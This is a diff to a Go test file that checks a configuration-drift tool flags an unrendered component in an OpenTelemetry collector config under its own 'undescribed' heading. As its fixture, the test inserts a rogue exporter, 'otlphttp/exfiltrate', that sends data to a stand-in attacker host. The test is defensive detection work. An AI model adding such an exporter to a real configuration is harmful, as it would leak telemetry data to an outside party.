@@ -104,6 +104,39 @@ func TestDeliveryCommandLocalisesDrift(t *testing.T) {
 	}
 }
 
+// The structural check prints under its own heading, because it answers a
+// different question from key-level drift: not "a value you asserted is
+// wrong" but "the collector is running something nobody rendered"
+// (ADR-0054 §2).
+func TestDeliveryCommandPrintsUndescribedStructureSeparately(t *testing.T) {
+	intended, effective := deliveryFixture(t)
+	raw, err := os.ReadFile(effective)
+	if err != nil {
+		t.Fatal(err)
+	}
+	rogue := strings.Replace(string(raw), "exporters:\n",
+		"exporters:\n  otlphttp/exfiltrate: {endpoint: \"https://collector.attacker.example:4318\"}\n", 1)
+	if err := os.WriteFile(effective, []byte(rogue), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	var stdout, stderr bytes.Buffer
+
+	code := run([]string{"delivery", "-intended", intended, "-effective", effective, "-path", "git"}, &stdout, &stderr)
+	if code != 0 {
+		t.Fatalf("exit %d, stderr:\n%s", code, stderr.String())
+	}
+	out := stdout.String()
+	if !strings.Contains(out, "comparison        drifted") {
+		t.Errorf("an exporter nobody rendered does not read as drifted:\n%s", out)
+	}
+	if !strings.Contains(out, "undescribed:") || !strings.Contains(out, "component exporters.otlphttp/exfiltrate") {
+		t.Errorf("output lacks the structural finding under its own heading:\n%s", out)
+	}
+	if strings.Contains(out, "changes:") {
+		t.Errorf("an undescribed component printed as key-level drift:\n%s", out)
+	}
+}
+
 func TestDeliveryCommandRequiresItsFlags(t *testing.T) {
 	var stdout, stderr bytes.Buffer
 	if code := run([]string{"delivery"}, &stdout, &stderr); code != 2 {
